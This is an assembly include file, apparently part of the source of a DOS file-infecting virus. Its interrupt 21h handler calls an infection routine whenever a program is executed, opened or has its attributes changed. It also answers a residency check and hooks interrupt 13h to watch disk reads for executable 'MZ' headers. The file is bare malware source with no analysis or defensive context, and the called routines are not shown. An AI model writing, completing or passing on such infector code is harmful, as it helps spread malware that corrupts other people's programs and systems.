   ; - -[INTS.INC] - - - - - - - - - - - - - - - - - - - - - - - - - - - - - >8

   int_21:         cmp     ax, in_id
                   je      ax_in_id

                   cmp     ax, 4b00h
                   je      infect_dsdx
                   cmp     ah, 43h
                   je      infect_dsdx
                   cmp     ah, 3Dh
                   je      infect_dsdx

   exit_21:        db      0eah
   old_21          dd      ?

   infect_dsdx:    call    infect_file
                   jmp     exit_21

   ax_in_id:       mov     ax, out_id
                   iret

   int_13_sh:      cmp     ax, in_id
                   je      ax_in_id

                   call    disable_sh
                   call    switch_13
                   mov     cs:save_ax, ax
                   call    rest_sh_state

                   pushf
                   db      09Ah
   real_13         dd      ?

                   pushf
                   call    disable_sh

                   cmp     CS:save_ax.b1, 02h
                   jne     @@1

                   cmp     es:[bx].w0, 'ZM'
                   jne     @@2
                   call    hook_21
   @@2:
                   call    analize_13_02
   @@1:
                   call    switch_13

                   call    rest_sh_state
                   popf

                   retf    2
